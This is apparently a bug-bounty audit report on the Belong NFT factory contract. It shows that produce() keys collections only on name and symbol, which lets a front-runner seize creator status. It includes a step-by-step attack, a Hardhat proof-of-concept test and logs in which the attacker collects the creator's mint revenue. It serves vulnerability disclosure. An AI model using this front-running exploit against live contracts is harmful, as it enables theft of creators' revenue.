# 57738 sc medium name squatting front run on produce allows attacker to preempt legitimate creator and capture future mint revenue

* **Submitted on:** Oct 28th 2025 at 15:23:46 UTC by @TECHFUND\_inc for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)
* **Report ID:** #57738
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Theft of unclaimed royalties

## Description

### Brief / Intro

The `produce()` function derives the deterministic salt only from `name` and `symbol`. An attacker can call `produce()` first for a given name/symbol and become the registered creator — capturing future royalties/fees and blocking the real creator.

### Vulnerability Details

* `produce()` computes `hashedSalt = _metadataHash(name, symbol)` and uses that to check/create the deterministic contracts.
* Because `hashedSalt` **does not include the creator address**, anyone who knows the intended name+symbol can call `produce()` first.
* The first caller becomes `creator` in `getNftInstanceInfo[hashedSalt]` and in the `AccessToken` initialization. The legitimate creator who tries later will be blocked by `TokenAlreadyExists()`.
* The attacker can therefore receive creator payouts or route royalties to themselves when someone mints NFT, and can prevent the real creator from deploying their collection.

Relevant code excerpt from Factory.sol:

```javascript
function produce(AccessTokenInfo memory accessTokenInfo, bytes32 referralCode)
        external
        returns (address nftAddress)
    {
        FactoryParameters memory factoryParameters = _nftFactoryParameters;

        factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo);

         // @audit-issue : missing creator address from hash attacker can dos legitimate creator .
        bytes32 hashedSalt = _metadataHash(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol);

        require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());

        accessTokenInfo.paymentToken = accessTokenInfo.paymentToken == address(0)
            ? factoryParameters.defaultPaymentCurrency
            : accessTokenInfo.paymentToken;

        Implementations memory currentImplementations = _currentImplementations;

        address predictedRoyaltiesReceiver =
            currentImplementations.royaltiesReceiver.predictDeterministicAddress(hashedSalt, address(this));
        address predictedAccessToken =
            currentImplementations.accessToken.predictDeterministicAddressERC1967(hashedSalt, address(this));

        address receiver;
        _setReferralUser(referralCode, msg.sender);
        if (accessTokenInfo.feeNumerator > 0) {
            receiver = currentImplementations.royaltiesReceiver.cloneDeterministic(hashedSalt);
            require(predictedRoyaltiesReceiver == receiver, RoyaltiesReceiverAddressMismatch());
            RoyaltiesReceiverV2(payable(receiver))
                .initialize(
                    RoyaltiesReceiverV2.RoyaltiesReceivers(
                        msg.sender, factoryParameters.platformAddress, referrals[referralCode].creator
                    ),
                    Factory(address(this)),
                    referralCode
                );
        }

        nftAddress = currentImplementations.accessToken.deployDeterministicERC1967(hashedSalt);
        require(predictedAccessToken == nftAddress, AccessTokenAddressMismatch());
@->        AccessToken(nftAddress)
            .initialize(
                AccessToken.AccessTokenParameters({
                    factory: Factory(address(this)),
                    info: accessTokenInfo,
                    creator: msg.sender,
                    feeReceiver: receiver,
                    referralCode: referralCode
                }),
                factoryParameters.transferValidator
            );

        NftInstanceInfo memory accessTokenInstanceInfo = NftInstanceInfo({
            creator: msg.sender,
            nftAddress: nftAddress,
            royaltiesReceiver: receiver,
            metadata: NftMetadata({name: accessTokenInfo.metadata.name, symbol: accessTokenInfo.metadata.symbol})
        });

@->        getNftInstanceInfo[hashedSalt] = accessTokenInstanceInfo;

        emit AccessTokenCreated(hashedSalt, accessTokenInstanceInfo);
    }
```

Relevant mint and payment flow excerpts:

From AccessToken mintStaticPrice:

```javascript
function mintStaticPrice(
        address receiver,
        StaticPriceParameters[] calldata paramsArray,
        address expectedPayingToken,
        uint256 expectedMintPrice
    ) external payable expectedTokenCheck(expectedPayingToken) nonReentrant {
        Factory.FactoryParameters memory factoryParameters = parameters.factory.nftFactoryParameters();

        require(paramsArray.length <= factoryParameters.maxArraySize, WrongArraySize());

        AccessTokenInfo memory info = parameters.info;

        uint256 amountToPay;
        for (uint256 i; i < paramsArray.length; ++i) {
   .........      
   }

            _baseMint(paramsArray[i].tokenId, receiver, paramsArray[i].tokenUri);
        }

  @->      require(_pay(amountToPay, expectedPayingToken) == expectedMintPrice, PriceChanged(expectedMintPrice));
    }
```

From \_pay:

```javascript
 function _pay(uint256 price, address expectedPayingToken) private returns (uint256 amount) {
        .........

        uint256 fees = (amount * factoryParameters.platformCommission) / PLATFORM_COMISSION_DENOMINATOR;
        uint256 amountToCreator;
        unchecked {
            amountToCreator = amount - fees;
        }

        bytes32 referralCode = _parameters.referralCode;
        uint256 referralFees;
        address refferalCreator;
        if (referralCode != bytes32(0)) {
            referralFees = _parameters.factory.getReferralRate(_parameters.creator, referralCode, fees);
            if (referralFees > 0) {
                refferalCreator = _parameters.factory.getReferralCreator(referralCode);
                unchecked {
                    fees -= referralFees;
                }
            }
        }

        if (expectedPayingToken == NATIVE_CURRENCY_ADDRESS) {
            if (fees > 0) {
                factoryParameters.platformAddress.safeTransferETH(fees);
            }
            if (referralFees > 0) {
                refferalCreator.safeTransferETH(referralFees);
            }

@->            _parameters.creator.safeTransferETH(amountToCreator);
        } else {
            expectedPayingToken.safeTransferFrom(msg.sender, address(this), amount);

            if (fees > 0) {
                expectedPayingToken.safeTransfer(factoryParameters.platformAddress, fees);
            }
            if (referralFees > 0) {
                expectedPayingToken.safeTransfer(refferalCreator, referralFees);
            }

@->            expectedPayingToken.safeTransfer(_parameters.creator, amountToCreator);
        }

        emit Paid(msg.sender, expectedPayingToken, amount);
    }
```

## Impact Details

An attacker can:

* Steal future mint revenue and royalties.
* Block legitimate creators from launching their collections (griefing).
* Damage the protocol’s reputation.

This is direct, ongoing financial harm — not just a one-time annoyance.

## References

* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/platform/Factory.sol#L238>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/platform/Factory.sol#L289>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L198>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L355>

## Proof of Concept (PoC)

{% stepper %}
{% step %}

### Step 1 — Alice prepares signed message off-chain

* Alice creates signed message for her AccessToken collection (name, symbol, contractURI, feeNumerator, chainId).
* This signature is what `produce()` expects to verify.
  {% endstep %}

{% step %}

### Step 2 — Attacker front-runs produce()

* Bob monitors the mempool, sees Alice's `produce()` transaction, and front-runs with higher gas by calling `produce()` with the same AccessTokenInfo.
* Because hashedSalt is only derived from name+symbol (not creator), Bob becomes the creator for that hashedSalt.
  {% endstep %}

{% step %}

### Step 3 — Alice's produce() reverts

* Alice's transaction reverts with `TokenAlreadyExists`, losing gas and unable to deploy her collection.
  {% endstep %}

{% step %}

### Step 4 — Buyers mint from the attacker's collection

* Buyers mint from the deployed collection; payments/creator share are routed to the attacker (Bob) via \_pay, since the on-chain creator is Bob.
* Result: attacker receives creator share; Alice receives nothing.
  {% endstep %}
  {% endstepper %}

PoC test (use in factory.test.ts — run with `yarn hardhat test`):

```javascript
it.only('PoC: attacker pre-deploys AccessToken and collects mint revenue from buys', async () => {
  const { factory, validator, alice, bob, charlie, signer } = await loadFixture(fixture);

  const nftName = 'AccessToken 1';
  const nftSymbol = 'AT1';
  const contractURI = 'contractURI/AccessToken123';
  const price = ethers.utils.parseEther('0.05'); // single-mint price
  const feeNumerator = 500;

  console.log('\n=== Initial Setup ===');
  console.log('Legitimate creator (Alice):', alice.address);
  console.log('Attacker (Bob):', bob.address);
  console.log('Buyer (Charlie):', charlie.address);

  // -------------------------
  // Step 1: Legitimate creator (Alice) prepares signed message off-chain
  // -------------------------
  console.log('\n=== Step 1: Alice prepares AccessToken deployment signature ===');
  const message = hashAccessTokenInfo(nftName, nftSymbol, contractURI, feeNumerator, chainId);
  const signature = EthCrypto.sign(signer.privateKey, message);
  console.log('Signature created for:', nftName, '/', nftSymbol);

  // AccessTokenInfo structured exactly as produce expects
  const accessTokenInfo: AccessTokenInfoStruct = {
    metadata: { name: nftName, symbol: nftSymbol },
    contractURI: contractURI,
    paymentToken: NATIVE_CURRENCY_ADDRESS,
    mintPrice: price,
    whitelistMintPrice: price,
    transferable: true,
    maxTotalSupply: BigNumber.from('1000'),
    feeNumerator,
    collectionExpire: BigNumber.from('86400'),
    signature: signature,
  };

  // -------------------------
  // Step 2: Attacker (Bob) monitors mempool and front-runs Alice's produce() call
  // -------------------------
  console.log('\n=== Step 2: Attacker (Bob) front-runs and calls produce() ===');
  console.log('Bob sees Alice\'s transaction in mempool and front-runs with higher gas');
  
  const txBob = await factory.connect(bob).produce(accessTokenInfo, ethers.constants.HashZero);
  const rcptBob = await txBob.wait();

  // Get AccessTokenCreated event and deployed address
  const evtBob = rcptBob.events?.find((e: any) => e.event === 'AccessTokenCreated');
  expect(evtBob, 'AccessTokenCreated event not found').to.not.be.undefined;
  const instanceInfoBob = evtBob!.args[1];
  const deployedAddressBob = instanceInfoBob.nftAddress;
  expect(deployedAddressBob).to.not.equal(ethers.constants.AddressZero);

  console.log(' Collection deployed at:', deployedAddressBob);
  console.log(' Bob successfully front-ran Alice!');

  // Confirm the deployed contract recorded bob as creator
  const nftBob = await ethers.getContractAt('AccessToken', deployedAddressBob);
  const params = await nftBob.parameters();
  const creatorBob = params.creator;
  expect(creatorBob).to.equal(bob.address);
  console.log(' Collection creator is now Bob (attacker):', creatorBob);

  // -------------------------
  // Step 3: Legitimate creator (Alice) tries to produce and fails
  // -------------------------
  console.log('\n=== Step 3: Alice tries to deploy but transaction reverts ===');
  
  await expect(
    factory.connect(alice).produce(accessTokenInfo, ethers.constants.HashZero)
  ).to.be.revertedWithCustomError(factory, 'TokenAlreadyExists');

  console.log(' Alice\'s transaction reverted - collection already exists!');
  console.log(' Alice lost gas fees and cannot deploy her collection');

  // -------------------------
  // Step 4: Buyer (Charlie) mints from Bob's collection via mintStaticPrice()
  // -------------------------
  console.log('\n=== Step 4: Buyer (Charlie) mints from the collection ===');
  console.log('Charlie thinks he\'s supporting Alice, but is actually paying Bob');
  
  const tokenId = BigNumber.from(1);
  const tokenUri = 'ipfs://token-1';
  const whitelisted = false;

  // Build the message hash for static price mint
  // Based on checkStaticPriceParameters: keccak256(abi.encodePacked(receiver, tokenId, tokenUri, whitelisted, chainid))
  const staticMsg = ethers.utils.solidityKeccak256(
    ['address', 'uint256', 'string', 'bool', 'uint256'],
    [charlie.address, tokenId, tokenUri, whitelisted, chainId]
  );
  
  const staticSig = EthCrypto.sign(signer.privateKey, staticMsg);

  const paramsArray = [
    {
      tokenId,
      tokenUri,
      whitelisted,
      signature: staticSig,
    },
  ];

  const expectedMintPrice = price;

  // Snapshot balances before the mint
  const bobBalanceBefore = await ethers.provider.getBalance(bob.address);
  const charlieBalanceBefore = await ethers.provider.getBalance(charlie.address);
  const aliceBalanceBefore = await ethers.provider.getBalance(alice.address);

  console.log('Charlie pays:', ethers.utils.formatEther(price), 'ETH to mint');

  // Charlie sends the mint transaction to Bob's collection
  const txMint = await nftBob
    .connect(charlie)
    .mintStaticPrice(
      charlie.address,
      paramsArray,
      NATIVE_CURRENCY_ADDRESS,
      expectedMintPrice,
      { value: expectedMintPrice },
    );
  const rcptMint = await txMint.wait();

  // Snapshot balances after the mint
  const bobBalanceAfter = await ethers.provider.getBalance(bob.address);
  const charlieBalanceAfter = await ethers.provider.getBalance(charlie.address);
  const aliceBalanceAfter = await ethers.provider.getBalance(alice.address);

  // Get platform commission to calculate expected shares
  const nftFactoryParams = await factory.nftFactoryParameters();
  const platformCommissionBps = nftFactoryParams.platformCommission;

  // Calculate fees and creator share
  const fees = price.mul(platformCommissionBps).div(10000);
  const expectedCreatorShare = price.sub(fees);

  const bobActualGain = bobBalanceAfter.sub(bobBalanceBefore);
  const aliceGain = aliceBalanceAfter.sub(aliceBalanceBefore);
  
  console.log('\n=== Financial Impact ===');
  console.log('Mint price:', ethers.utils.formatEther(price), 'ETH');
  console.log('Platform commission:', platformCommissionBps.toString(), 'bps');
  console.log('Platform fees:', ethers.utils.formatEther(fees), 'ETH');
  console.log('Creator share:', ethers.utils.formatEther(expectedCreatorShare), 'ETH');
  console.log('');
  console.log('Bob (attacker) gained:', ethers.utils.formatEther(bobActualGain), 'ETH ');
  console.log('Alice (victim) gained:', ethers.utils.formatEther(aliceGain), 'ETH (should have received creator share)');

  // Assert Bob (the attacker) received the creator share
  expect(bobActualGain).to.equal(expectedCreatorShare);
  expect(aliceGain).to.equal(0); // Alice gets nothing

  console.log('\n Attack successful! Bob stole the creator revenue');

  // Verify Charlie owns the token
  const ownerOfToken = await nftBob.ownerOf(tokenId);
  expect(ownerOfToken).to.equal(charlie.address);
  console.log('Charlie received token #1 (but paid the wrong creator)');

  // -------------------------
  // Summary
  // -------------------------
  console.log('\n=== ATTACK SUMMARY ===');
  console.log(' Attack Flow:');
  console.log('   1. Alice creates signed message for her AccessToken collection');
  console.log('   2. Bob monitors mempool and sees Alice\'s produce() transaction');
  console.log('   3. Bob front-runs with higher gas, calling produce() with same signature');
  console.log('   4. Bob\'s transaction executes first - he becomes the creator');
  console.log('   5. Alice\'s transaction reverts (TokenAlreadyExists)');
  console.log('   6. Buyers mint from Bob\'s collection, enriching the attacker');
  console.log('');
  console.log(' Financial Impact:');
  console.log('   - Bob gained:', ethers.utils.formatEther(expectedCreatorShare), 'ETH (from 1 mint)');
  console.log('   - Alice gained: 0 ETH (lost gas + lost all creator revenue)');
  console.log('   - Total potential theft: ALL future mint revenue from this collection');
  console.log('');
  console.log('   - Complete collection hijacking');
  console.log('   - Permanent loss of creator revenue');
  console.log('   - Reputation damage (buyers think they support Alice)');
  console.log('   - No recovery mechanism');
  console.log('');
  console.log(' Proof:');
  console.log('   - Deployed collection:', deployedAddressBob);
  console.log('   - On-chain creator:', creatorBob, '(Bob, not Alice)');
  console.log('   - Revenue recipient:', bob.address, '(attacker)');
  console.log('');
  console.log(' POC Complete: Front-running attack successfully demonstrated');
});
```

## Logs (execution output)

<details>

<summary>Show logs</summary>

```javascript
=== Initial Setup ===
Legitimate creator (Alice): 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
Attacker (Bob): 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
Buyer (Charlie): 0x90F79bf6EB2c4f870365E785982E1f101E93b906

=== Step 1: Alice prepares AccessToken deployment signature ===
Signature created for: AccessToken 1 / AT1

=== Step 2: Attacker (Bob) front-runs and calls produce() ===
Bob sees Alice's transaction in mempool and front-runs with higher gas
 Collection deployed at: 0xf60e150b29990Eb6CA44391dF9E9aC6697f145d7
 Bob successfully front-ran Alice!
 Collection creator is now Bob (attacker): 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

=== Step 3: Alice tries to deploy but transaction reverts ===
 Alice's transaction reverted - collection already exists!
 Alice lost gas fees and cannot deploy her collection

=== Step 4: Buyer (Charlie) mints from the collection ===
Charlie thinks he's supporting Alice, but is actually paying Bob
Charlie pays: 0.05 ETH to mint

=== Financial Impact ===
Mint price: 0.05 ETH
Platform commission: 100 bps
Platform fees: 0.0005 ETH
Creator share: 0.0495 ETH

Bob (attacker) gained: 0.0495 ETH 
Alice (victim) gained: 0.0 ETH (should have received creator share)

 Attack successful! Bob stole the creator revenue
Charlie received token #1 (but paid the wrong creator)

=== ATTACK SUMMARY ===
 Attack Flow:
   1. Alice creates signed message for her AccessToken collection
   2. Bob monitors mempool and sees Alice's produce() transaction
   3. Bob front-runs with higher gas, calling produce() with same signature
   4. Bob's transaction executes first - he becomes the creator
   5. Alice's transaction reverts (TokenAlreadyExists)
   6. Buyers mint from Bob's collection, enriching the attacker

 Financial Impact:
   - Bob gained: 0.0495 ETH (from 1 mint)
   - Alice gained: 0 ETH (lost gas + lost all creator revenue)
   - Total potential theft: ALL future mint revenue from this collection

   - Complete collection hijacking
   - Permanent loss of creator revenue
   - Reputation damage (buyers think they support Alice)
   - No recovery mechanism

 Proof:
   - Deployed collection: 0xf60e150b29990Eb6CA44391dF9E9aC6697f145d7
   - On-chain creator: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC (Bob, not Alice)
   - Revenue recipient: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC (attacker)

 POC Complete: Front-running attack successfully demonstrated
      ✔ PoC: attacker pre-deploys AccessToken and collects mint revenue from buys (2162ms)
```

</details>
